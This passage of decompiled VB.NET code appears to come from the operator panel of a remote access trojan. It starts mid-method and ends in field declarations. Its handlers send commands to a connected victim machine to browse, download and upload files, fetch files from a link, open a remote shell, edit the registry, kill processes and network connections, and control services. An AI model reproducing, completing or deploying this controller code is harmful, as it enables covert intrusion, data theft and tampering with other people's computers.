					array(2) = "fm"
					array(3) = Class7.string_1
					array(4) = "cp"
					array(5) = Class7.string_1
					Dim array3 As String() = array
					Dim num2 As Integer = 6
					Dim text As String = (Me.TextBox1.Text + "\").Replace("\\", "\")
					array3(num2) = Class6.smethod_14(text)
					array(7) = Class7.string_1
					array(8) = Class6.smethod_14(Me.Flist)
					client2.Send(String.Concat(array))
				End If
			End If
		End Sub

		' Token: 0x06000325 RID: 805 RVA: 0x0001B45C File Offset: 0x0001965C
		Private Sub DownloadToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L2.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					If Operators.CompareString(listViewItem.Text, "..", False) = 0 Then
						GoTo IL_5B
					End If
					If Operators.CompareString(listViewItem.SubItems(2).Text, "DIR", False) = 0 Then
						GoTo IL_5B
					End If
					Dim flag As Boolean = True
					IL_5C:
					If flag Then
						Dim array As String() = New String(8) {}
						array(0) = "Ex"
						array(1) = Class7.string_1
						array(2) = "fm"
						array(3) = Class7.string_1
						array(4) = "dw"
						array(5) = Class7.string_1
						Dim listViewItem2 As ListViewItem = listViewItem
						Dim toolTipText As String = listViewItem2.ToolTipText
						listViewItem2.ToolTipText = toolTipText
						array(6) = Class6.smethod_14(toolTipText)
						array(7) = Class7.string_1
						array(8) = Me.sk.ip()
						Me.sk.Send(String.Concat(array))
						Continue For
					End If
					Continue For
					IL_5B:
					flag = False
					GoTo IL_5C
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x06000326 RID: 806 RVA: 0x0001B578 File Offset: 0x00019778
		Private Sub UploadToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				If Me.L2.Items.Count <> 0 Then
					Dim text As String = Me.TextBox1.Text
					Dim openFileDialog As OpenFileDialog = New OpenFileDialog()
					openFileDialog.FileName = String.Empty
					openFileDialog.Multiselect = True
					If openFileDialog.ShowDialog() = DialogResult.OK Then
						Dim fileNames As String() = openFileDialog.FileNames
						Dim num As Integer = 0
						Dim num2 As Integer = fileNames.Length - 1
						Dim num3 As Integer = num
						While True
							Dim num4 As Integer = num3
							Dim num5 As Integer = num2
							If num4 > num5 Then
								Exit For
							End If
							Dim text2 As String = fileNames(num3)
							If FileSystem.FileLen(text2) <> 0L Then
								Dim up As up = New up()
								up.TMP = text2
								up.FN = (text + "\" + New FileInfo(text2).Name).Replace("\\", "\")
								up.Name = Me.sk.ip() + Class6.smethod_14(up.FN)
								up.osk = Me.sk
								up.SZ = CInt(FileSystem.FileLen(up.TMP))
								up.Text = New FileInfo(up.TMP).Name + " >> " + up.FN
								up.Show()
							End If
							num3 += 1
						End While
					End If
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000327 RID: 807 RVA: 0x0001B6F8 File Offset: 0x000198F8
		Private Sub NewEmptyFileToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = Interaction.InputBox("File Name?", "New File", "New Text.txt", -1, -1)
			If text.Length <> 0 Then
				Dim client As Client = Me.sk
				Dim array As String() = New String(6) {}
				array(0) = "Ex"
				array(1) = Class7.string_1
				array(2) = "fm"
				array(3) = Class7.string_1
				array(4) = "nf"
				array(5) = Class7.string_1
				Dim array2 As String() = array
				Dim num As Integer = 6
				Dim text2 As String = Me.TextBox1.Text + text
				array2(num) = Class6.smethod_14(text2)
				client.Send(String.Concat(array))
			End If
		End Sub

		' Token: 0x06000328 RID: 808 RVA: 0x0001B790 File Offset: 0x00019990
		Private Sub NewFolderToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = Interaction.InputBox("Folder Name?", "New Folder", "New Folder", -1, -1)
			If text.Length <> 0 Then
				Dim client As Client = Me.sk
				Dim array As String() = New String(6) {}
				array(0) = "Ex"
				array(1) = Class7.string_1
				array(2) = "fm"
				array(3) = Class7.string_1
				array(4) = "nd"
				array(5) = Class7.string_1
				Dim array2 As String() = array
				Dim num As Integer = 6
				Dim text2 As String = Me.TextBox1.Text + text
				array2(num) = Class6.smethod_14(text2)
				client.Send(String.Concat(array))
			End If
		End Sub

		' Token: 0x06000329 RID: 809 RVA: 0x0001B828 File Offset: 0x00019A28
		Private Sub OpenDownloadsToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Not Directory.Exists(Me.string_0) Then
				Directory.CreateDirectory(Me.string_0)
			End If
			Try
				Process.Start(Me.string_0)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600032A RID: 810 RVA: 0x0001B880 File Offset: 0x00019A80
		Private Sub RarToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.L2.SelectedItems.Count <> 0 Then
				Dim text As String = String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "rar", Class7.string_1 })
				Dim text2 As String = Interaction.InputBox("Enter Rar Name", String.Empty, New DirectoryInfo(Me.TextBox1.Text).Name + ".rar", -1, -1)
				If Operators.CompareString(text2, String.Empty, False) <> 0 Then
					Dim textBox As TextBox = Me.TextBox1
					Dim text3 As String = textBox.Text
					textBox.Text = text3
					text = String.Concat(New String() { text, Class6.smethod_14(text2), Class7.string_1, Class6.smethod_14(text3), Class7.string_1 })
					Dim str As String = "a -y """ + text2 + """"
					Try
						For Each obj As Object In Me.L2.SelectedItems
							Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
							str = str + " """ + listViewItem.Text + """"
						Next
					Finally
						Dim enumerator As IEnumerator
						If TypeOf enumerator Is IDisposable Then
							TryCast(enumerator, IDisposable).Dispose()
						End If
					End Try
					text += Class6.smethod_14(str)
					Me.sk.Send(text)
				End If
			End If
		End Sub

		' Token: 0x0600032B RID: 811 RVA: 0x0001BA18 File Offset: 0x00019C18
		Private Sub UnRarToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.L2.SelectedItems.Count <> 0 Then
				Dim listViewItem As ListViewItem = Me.L2.SelectedItems(0)
				Dim toolTipText As String = listViewItem.ToolTipText
				listViewItem.ToolTipText = toolTipText
				Dim s As String = String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "unrar", Class7.string_1 }) + Class6.smethod_14(toolTipText)
				Me.sk.Send(s)
			End If
		End Sub

		' Token: 0x0600032C RID: 812 RVA: 0x0001BAB4 File Offset: 0x00019CB4
		Private Sub UploadFromLinkToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Operators.CompareString(Me.TextBox1.Text, String.Empty, False) <> 0 Then
				Dim fromLink As FromLink = New FromLink()
				fromLink.ShowDialog(Me)
				If fromLink.IsOK Then
					Dim array As String() = New String(8) {}
					array(0) = "Ex"
					array(1) = Class7.string_1
					array(2) = "fm"
					array(3) = Class7.string_1
					array(4) = "fl"
					array(5) = Class7.string_1
					Dim textBox As TextBox = fromLink.TextBox1
					Dim text As String = textBox.Text
					textBox.Text = text
					array(6) = Class6.smethod_14(text)
					array(7) = Class7.string_1
					Dim array2 As String() = array
					Dim num As Integer = 8
					Dim text2 As String = Me.TextBox1.Text + fromLink.TextBox2.Text
					array2(num) = Class6.smethod_14(text2)
					Me.sk.Send(String.Concat(array))
				End If
			End If
		End Sub

		' Token: 0x0600032D RID: 813 RVA: 0x00002F56 File Offset: 0x00001156
		Private Sub RGk_NodeMouseClick(sender As Object, e As TreeNodeMouseClickEventArgs)
			If e.Button = MouseButtons.Left Then
				If e.Node.IsExpanded Then
					e.Node.Collapse()
				Else
					e.Node.Expand()
				End If
			End If
		End Sub

		' Token: 0x0600032E RID: 814 RVA: 0x0001BB94 File Offset: 0x00019D94
		Private Sub ListView1_SelectedIndexChanged(sender As Object, e As EventArgs)
			Try
				If Me.ListView1.SelectedItems.Count <> 0 Then
					Me.cur = CType(Me.ListView1.SelectedIndices(0), Manager.CR)
					Select Case Me.cur
						Case Manager.CR.fm
							Me.FMM.BringToFront()
							Me.LPR.SendToBack()
							Me.LTCP.SendToBack()
							Me.RG.SendToBack()
							Me.RG.SendToBack()
							Me.sh.SendToBack()
							Me.LSRV.SendToBack()
							Me.L2.method_3()
						Case Manager.CR.PR
							Me.LPR.BringToFront()
							Me.LPR.method_3()
						Case Manager.CR.tcp
							Me.LTCP.BringToFront()
							Me.LTCP.method_3()
						Case Manager.CR.reg
							Me.RG.BringToFront()
						Case Manager.CR.shl
							Me.sh.BringToFront()
							If Me.shStarted = 0 Then
								Me.shStarted = 1
								Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "rs", Class7.string_1, "~" }))
							End If
						Case Manager.CR.srv
							Me.LSRV.BringToFront()
							Me.LSRV.method_3()
					End Select
					Me.Icon = Icon.FromHandle(CType(Me.vmethod_148.Images(Me.ListView1.SelectedItems(0).ImageIndex), Bitmap).GetHicon())
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600032F RID: 815 RVA: 0x0001BD7C File Offset: 0x00019F7C
		Private Sub KillConnectionToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = String.Concat(New String() { "Ex", Class7.string_1, "tcp", Class7.string_1, "!" })
			If Me.LTCP.SelectedItems.Count <> 0 Then
				Try
					For Each obj As Object In Me.LTCP.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						text = text + Class7.string_1 + listViewItem.Tag.ToString()
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Me.sk.Send(text)
			End If
		End Sub

		' Token: 0x06000330 RID: 816 RVA: 0x0001BE4C File Offset: 0x0001A04C
		Private Sub RefreshToolStripMenuItem3_Click(sender As Object, e As EventArgs)
			Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "~" }))
		End Sub

		' Token: 0x06000331 RID: 817 RVA: 0x0001BE9C File Offset: 0x0001A09C
		Private Sub CreateKeyToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.RGk.SelectedNode IsNot Nothing AndAlso Me.RGk.SelectedNode.FullPath.Contains("\") Then
				Dim text As String = Interaction.InputBox("Key Name?", "Create New Key", "Name", -1, -1)
				If text.Length <> 0 Then
					Me.RGk.Enabled = False
					Me.RGLIST.Enabled = False
					Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "#", Class7.string_1, Me.RGk.SelectedNode.FullPath, "\", Class7.string_1, text }))
					Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, Me.RGk.SelectedNode.FullPath, "\" }))
				End If
			End If
		End Sub

		' Token: 0x06000332 RID: 818 RVA: 0x0001BFF4 File Offset: 0x0001A1F4
		Private Sub DeleteSelectedToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.RGk.SelectedNode IsNot Nothing Then
				Dim fullPath As String = Me.RGk.SelectedNode.FullPath
				If fullPath.Contains("\") Then
					Dim text As String = Strings.Split(fullPath, "\", -1, CompareMethod.Binary)(Strings.Split(fullPath, "\", -1, CompareMethod.Binary).Length - 1)
					Dim text2 As String = String.Empty
					Dim num As Integer = Strings.Split(fullPath, "\", -1, CompareMethod.Binary).Length - 2
					For i As Integer = 0 To num
						text2 = text2 + Strings.Split(fullPath, "\", -1, CompareMethod.Binary)(i) + "\"
					Next
					Me.RGk.Enabled = False
					Me.RGLIST.Enabled = False
					Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "$", Class7.string_1, text2, Class7.string_1, text }))
					Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, text, "\" }))
				End If
			End If
		End Sub

		' Token: 0x06000333 RID: 819 RVA: 0x0001C180 File Offset: 0x0001A380
		Private Sub StopToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.LSRV.SelectedItems.Count <> 0 Then
				Dim text As String = String.Empty
				Try
					For Each obj As Object In Me.LSRV.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						text = text + Class7.string_1 + listViewItem.Text
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "srv", Class7.string_1, "!", text }))
			End If
		End Sub

		' Token: 0x06000334 RID: 820 RVA: 0x0001C258 File Offset: 0x0001A458
		Private Sub PauseToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.LSRV.SelectedItems.Count <> 0 Then
				Dim text As String = String.Empty
				Try
					For Each obj As Object In Me.LSRV.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						text = text + Class7.string_1 + listViewItem.Text
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "srv", Class7.string_1, "@", text }))
			End If
		End Sub

		' Token: 0x06000335 RID: 821 RVA: 0x0001C330 File Offset: 0x0001A530
		Private Sub StartToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.LSRV.SelectedItems.Count <> 0 Then
				Dim text As String = String.Empty
				Try
					For Each obj As Object In Me.LSRV.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						text = text + Class7.string_1 + listViewItem.Text
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "srv", Class7.string_1, "#", text }))
			End If
		End Sub

		' Token: 0x06000336 RID: 822 RVA: 0x0001C408 File Offset: 0x0001A608
		Private Sub EditToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			If Me.L2.SelectedItems.Count > 0 Then
				Dim text As String = String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "rd" })
				Try
					For Each obj As Object In Me.L2.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						If Operators.CompareString(listViewItem.SubItems(2).Text, "DIR", False) <> 0 Then
							Dim listViewItem2 As ListViewItem = listViewItem
							Dim toolTipText As String = listViewItem2.ToolTipText
							listViewItem2.ToolTipText = toolTipText
							text = text + Class7.string_1 + Class6.smethod_14(toolTipText)
						End If
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Me.sk.Send(text)
			End If
		End Sub

		' Token: 0x06000337 RID: 823 RVA: 0x0001A9C4 File Offset: 0x00018BC4
		Private Sub RefreshToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			If Me.RGk.SelectedNode IsNot Nothing Then
				Me.RGk.Enabled = False
				Me.RGLIST.Enabled = False
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, Me.RGk.SelectedNode.FullPath, "\" }))
			End If
		End Sub

		' Token: 0x06000338 RID: 824 RVA: 0x0001C50C File Offset: 0x0001A70C
		Private Sub vmethod_26_Tick(sender As Object, e As EventArgs)
			Me.vmethod_26.Enabled = False
			If Me.sk Is Nothing Then
				Me.Close()
			ElseIf Not Me.sk.CN Then
				Me.Close()
			Else
				Try
					Select Case Me.cur
						Case Manager.CR.PR
							Me.vmethod_26.Interval = 2000
							If Me.PRNXT Then
								Dim enumerator As IEnumerator = Me.LPR.Items.GetEnumerator()
								Dim text As String = String.Empty
								While enumerator.MoveNext()
									Dim obj As Object = enumerator.Current
									Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
									If listViewItem IsNot Nothing Then
										text = text + Class7.string_1 + listViewItem.SubItems(1).Text
									End If
								End While
								Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "proc", Class7.string_1, "U", text }))
								Me.PRNXT = False
							End If
						Case Manager.CR.tcp
							Me.vmethod_26.Interval = 2000
							If Me.TCPNXT Then
								Dim text2 As String = String.Concat(New String() { "Ex", Class7.string_1, "tcp", Class7.string_1, "~", Class7.string_1 })
								Try
									For Each obj2 As Object In Me.LTCP.Items
										Dim listViewItem2 As ListViewItem = CType(obj2, ListViewItem)
										text2 = text2 + listViewItem2.Tag.ToString() + Class7.string_1
									Next
								Finally
									Dim enumerator2 As IEnumerator
									If TypeOf enumerator2 Is IDisposable Then
										TryCast(enumerator2, IDisposable).Dispose()
									End If
								End Try
								Me.sk.Send(text2)
								Me.TCPNXT = False
							End If
						Case Manager.CR.srv
							Me.vmethod_26.Interval = 4000
							If Me.srvNxt Then
								Dim s As String = String.Concat(New String() { "Ex", Class7.string_1, "srv", Class7.string_1, "~" })
								Me.sk.Send(s)
								Me.srvNxt = False
							End If
					End Select
				Catch ex As Exception
				End Try
				Me.vmethod_26.Enabled = True
			End If
		End Sub

		' Token: 0x06000339 RID: 825 RVA: 0x00002F8C File Offset: 0x0000118C
		Private Sub L1_DoubleClick1(sender As Object, e As EventArgs)
			If Me.L1.SelectedItems.Count <> 0 Then
				Me.exp(Me.L1.SelectedItems(0).ToolTipText, False)
			End If
		End Sub

		' Token: 0x0600033A RID: 826 RVA: 0x00002A6F File Offset: 0x00000C6F
		Private Sub L1_SelectedIndexChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x04000109 RID: 265
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x0400010B RID: 267
		<AccessedThroughProperty("StatusStrip1")>
		Private _StatusStrip1 As StatusStrip

		' Token: 0x0400010C RID: 268
		<AccessedThroughProperty("SL")>
		Private _SL As ToolStripStatusLabel

		' Token: 0x0400010D RID: 269
		<AccessedThroughProperty("pr")>
		Private _pr As ToolStripProgressBar

		' Token: 0x0400010E RID: 270
		<AccessedThroughProperty("M1")>
		Private _M1 As ContextMenuStrip

		' Token: 0x0400010F RID: 271
		<AccessedThroughProperty("KillToolStripMenuItem1")>
		Private _KillToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x04000110 RID: 272
		<AccessedThroughProperty("KillDeleteToolStripMenuItem")>
		Private _KillDeleteToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000111 RID: 273
		<AccessedThroughProperty("RestartProcessToolStripMenuItem")>
		Private _RestartProcessToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000112 RID: 274
		<AccessedThroughProperty("vmethod_26")>
		Private _vmethod_26 As Timer

		' Token: 0x04000113 RID: 275
		<AccessedThroughProperty("ImageList1")>
		Private _ImageList1 As ImageList

		' Token: 0x04000114 RID: 276
		<AccessedThroughProperty("ContextMenuStrip1")>
		Private _ContextMenuStrip1 As ContextMenuStrip

		' Token: 0x04000115 RID: 277
		<AccessedThroughProperty("KillConnectionToolStripMenuItem")>
		Private _KillConnectionToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000116 RID: 278
		<AccessedThroughProperty("crg")>
		Private _crg As ContextMenuStrip

		' Token: 0x04000117 RID: 279
		<AccessedThroughProperty("RefreshToolStripMenuItem")>
		Private _RefreshToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000118 RID: 280
		<AccessedThroughProperty("EditToolStripMenuItem")>
		Private _EditToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000119 RID: 281
		<AccessedThroughProperty("NewValueToolStripMenuItem")>
		Private _NewValueToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400011A RID: 282
		<AccessedThroughProperty("DeleteToolStripMenuItem")>
		Private _DeleteToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400011B RID: 283
		<AccessedThroughProperty("rimg")>
		Private _rimg As ImageList

		' Token: 0x0400011C RID: 284
		<AccessedThroughProperty("crgk")>
		Private _crgk As ContextMenuStrip

		' Token: 0x0400011D RID: 285
		<AccessedThroughProperty("RefreshToolStripMenuItem1")>
		Private _RefreshToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x0400011E RID: 286
		<AccessedThroughProperty("CreateKeyToolStripMenuItem")>
		Private _CreateKeyToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400011F RID: 287
		<AccessedThroughProperty("DeleteSelectedToolStripMenuItem")>
		Private _DeleteSelectedToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000120 RID: 288
		<AccessedThroughProperty("ContextMenuStrip2")>
		Private _ContextMenuStrip2 As ContextMenuStrip

		' Token: 0x04000121 RID: 289
		<AccessedThroughProperty("StopToolStripMenuItem")>
		Private _StopToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000122 RID: 290
		<AccessedThroughProperty("PauseToolStripMenuItem")>
		Private _PauseToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000123 RID: 291
		<AccessedThroughProperty("StartToolStripMenuItem")>
		Private _StartToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000124 RID: 292
		<AccessedThroughProperty("ContextMenuStrip3")>
		Private _ContextMenuStrip3 As ContextMenuStrip

		' Token: 0x04000125 RID: 293
		<AccessedThroughProperty("UPToolStripMenuItem")>
		Private _UPToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000126 RID: 294
		<AccessedThroughProperty("RefreshToolStripMenuItem2")>
		Private _RefreshToolStripMenuItem2 As ToolStripMenuItem

		' Token: 0x04000127 RID: 295
		<AccessedThroughProperty("RunToolStripMenuItem")>
		Private _RunToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000128 RID: 296
		<AccessedThroughProperty("DeleteToolStripMenuItem1")>
		Private _DeleteToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x04000129 RID: 297
		<AccessedThroughProperty("EditToolStripMenuItem1")>
		Private _EditToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x0400012A RID: 298
		<AccessedThroughProperty("RenameToolStripMenuItem")>
		Private _RenameToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400012B RID: 299
		<AccessedThroughProperty("CopyToolStripMenuItem")>
		Private _CopyToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400012C RID: 300
		<AccessedThroughProperty("CutToolStripMenuItem")>
		Private _CutToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400012D RID: 301
		<AccessedThroughProperty("PasteToolStripMenuItem")>
		Private _PasteToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400012E RID: 302
		<AccessedThroughProperty("DownloadToolStripMenuItem")>
		Private _DownloadToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400012F RID: 303
		<AccessedThroughProperty("UploadToolStripMenuItem")>
		Private _UploadToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000130 RID: 304
		<AccessedThroughProperty("NewEmptyFileToolStripMenuItem")>
		Private _NewEmptyFileToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000131 RID: 305
		<AccessedThroughProperty("NewFolderToolStripMenuItem")>
		Private _NewFolderToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000132 RID: 306
		<AccessedThroughProperty("OpenDownloadsToolStripMenuItem")>
		Private _OpenDownloadsToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000133 RID: 307
		<AccessedThroughProperty("RarToolStripMenuItem")>
		Private _RarToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000134 RID: 308
		<AccessedThroughProperty("UnRarToolStripMenuItem")>
		Private _UnRarToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000135 RID: 309
		<AccessedThroughProperty("UploadFromLinkToolStripMenuItem")>
		Private _UploadFromLinkToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000136 RID: 310
		<AccessedThroughProperty("ContextMenuStrip4")>
		Private _ContextMenuStrip4 As ContextMenuStrip

		' Token: 0x04000137 RID: 311
		<AccessedThroughProperty("RefreshToolStripMenuItem3")>
		Private _RefreshToolStripMenuItem3 As ToolStripMenuItem

		' Token: 0x04000138 RID: 312
		<AccessedThroughProperty("MG")>
		Private _MG As ImageList

		' Token: 0x04000139 RID: 313
		<AccessedThroughProperty("ListView1")>
		Private _ListView1 As ListView

		' Token: 0x0400013A RID: 314
		<AccessedThroughProperty("ColumnHeader1")>
		Private _ColumnHeader1 As ColumnHeader

		' Token: 0x0400013B RID: 315
		<AccessedThroughProperty("ColumnHeader2")>
		Private _ColumnHeader2 As ColumnHeader

		' Token: 0x0400013C RID: 316
		<AccessedThroughProperty("vmethod_148")>
		Private _vmethod_148 As ImageList

		' Token: 0x0400013D RID: 317
		<AccessedThroughProperty("Timer1")>
		Private _Timer1 As Timer

		' Token: 0x0400013E RID: 318
		<AccessedThroughProperty("FMM")>
		Private _FMM As Panel

		' Token: 0x0400013F RID: 319
		<AccessedThroughProperty("TextBox1")>
		Private _TextBox1 As TextBox

		' Token: 0x04000140 RID: 320
		<AccessedThroughProperty("L1")>
		Private _L1 As GClass9

		' Token: 0x04000141 RID: 321
		<AccessedThroughProperty("ColumnHeader6")>
		Private _ColumnHeader6 As ColumnHeader

		' Token: 0x04000142 RID: 322
		<AccessedThroughProperty("ColumnHeader7")>
		Private _ColumnHeader7 As ColumnHeader

		' Token: 0x04000143 RID: 323
		<AccessedThroughProperty("p")>
		Private _p As PictureBox

		' Token: 0x04000144 RID: 324
		<AccessedThroughProperty("L2")>
		Private _L2 As GClass9

		' Token: 0x04000145 RID: 325
		<AccessedThroughProperty("ColumnHeader8")>
		Private _ColumnHeader8 As ColumnHeader

		' Token: 0x04000146 RID: 326
		<AccessedThroughProperty("ColumnHeader9")>
		Private _ColumnHeader9 As ColumnHeader

		' Token: 0x04000147 RID: 327
		<AccessedThroughProperty("ColumnHeader10")>
		Private _ColumnHeader10 As ColumnHeader

		' Token: 0x04000148 RID: 328
		<AccessedThroughProperty("LTCP")>
		Private _LTCP As GClass9

		' Token: 0x04000149 RID: 329
		<AccessedThroughProperty("ColumnHeader16")>
		Private _ColumnHeader16 As ColumnHeader

		' Token: 0x0400014A RID: 330
		<AccessedThroughProperty("ColumnHeader17")>
		Private _ColumnHeader17 As ColumnHeader

		' Token: 0x0400014B RID: 331
		<AccessedThroughProperty("ColumnHeader18")>
		Private _ColumnHeader18 As ColumnHeader

		' Token: 0x0400014C RID: 332
		<AccessedThroughProperty("ColumnHeader19")>
		Private _ColumnHeader19 As ColumnHeader

		' Token: 0x0400014D RID: 333
		<AccessedThroughProperty("ColumnHeader20")>
		Private _ColumnHeader20 As ColumnHeader

		' Token: 0x0400014E RID: 334
		<AccessedThroughProperty("ColumnHeader21")>
		Private _ColumnHeader21 As ColumnHeader

		' Token: 0x0400014F RID: 335
		<AccessedThroughProperty("RG")>
		Private _RG As Panel

		' Token: 0x04000150 RID: 336
		<AccessedThroughProperty("RGLIST")>
		Private _RGLIST As GClass9

		' Token: 0x04000151 RID: 337
		<AccessedThroughProperty("ColumnHeader3")>
		Private _ColumnHeader3 As ColumnHeader

		' Token: 0x04000152 RID: 338
		<AccessedThroughProperty("ColumnHeader4")>
		Private _ColumnHeader4 As ColumnHeader

		' Token: 0x04000153 RID: 339
		<AccessedThroughProperty("ColumnHeader5")>
		Private _ColumnHeader5 As ColumnHeader

		' Token: 0x04000154 RID: 340
		<AccessedThroughProperty("RGk")>
		Private _RGk As TreeView

		' Token: 0x04000155 RID: 341
		<AccessedThroughProperty("sh")>
		Private _sh As Panel

		' Token: 0x04000156 RID: 342
		<AccessedThroughProperty("T1")>
		Private _T1 As RichTextBox

		' Token: 0x04000157 RID: 343
		<AccessedThroughProperty("T2")>
		Private _T2 As TextBox

		' Token: 0x04000158 RID: 344
		<AccessedThroughProperty("LPR")>
		Private _LPR As GClass9

		' Token: 0x04000159 RID: 345
		<AccessedThroughProperty("ColumnHeader22")>
		Private _ColumnHeader22 As ColumnHeader

		' Token: 0x0400015A RID: 346
		<AccessedThroughProperty("ColumnHeader23")>
		Private _ColumnHeader23 As ColumnHeader

		' Token: 0x0400015B RID: 347
		<AccessedThroughProperty("ColumnHeader24")>
		Private _ColumnHeader24 As ColumnHeader

		' Token: 0x0400015C RID: 348
		<AccessedThroughProperty("ColumnHeader25")>
		Private _ColumnHeader25 As ColumnHeader

		' Token: 0x0400015D RID: 349
		<AccessedThroughProperty("ColumnHeader26")>
		Private _ColumnHeader26 As ColumnHeader

		' Token: 0x0400015E RID: 350
		<AccessedThroughProperty("LSRV")>
		Private _LSRV As GClass9

		' Token: 0x0400015F RID: 351
		<AccessedThroughProperty("ColumnHeader11")>
		Private _ColumnHeader11 As ColumnHeader

		' Token: 0x04000160 RID: 352
		<AccessedThroughProperty("ColumnHeader12")>
		Private _ColumnHeader12 As ColumnHeader

		' Token: 0x04000161 RID: 353
		<AccessedThroughProperty("ColumnHeader13")>
		Private _ColumnHeader13 As ColumnHeader

		' Token: 0x04000162 RID: 354
		<AccessedThroughProperty("ColumnHeader14")>
		Private _ColumnHeader14 As ColumnHeader

		' Token: 0x04000163 RID: 355
		<AccessedThroughProperty("ColumnHeader15")>
		Private _ColumnHeader15 As ColumnHeader

		' Token: 0x04000164 RID: 356
		<AccessedThroughProperty("vmethod_108")>
		Private _vmethod_108 As ImageList

		' Token: 0x04000165 RID: 357
		Public Cache As Collection

		' Token: 0x04000166 RID: 358
		Public cur As Manager.CR

		' Token: 0x04000167 RID: 359
		Public Flist As String

		' Token: 0x04000168 RID: 360
		Public Images As Collection

		' Token: 0x04000169 RID: 361
		Private int_0 As Integer

		' Token: 0x0400016A RID: 362
		Private int_1 As Integer

		' Token: 0x0400016B RID: 363
		Public isCut As Boolean

		' Token: 0x0400016C RID: 364
		Public PID As Integer

		' Token: 0x0400016D RID: 365
		Public PRFX As Boolean

		' Token: 0x0400016E RID: 366
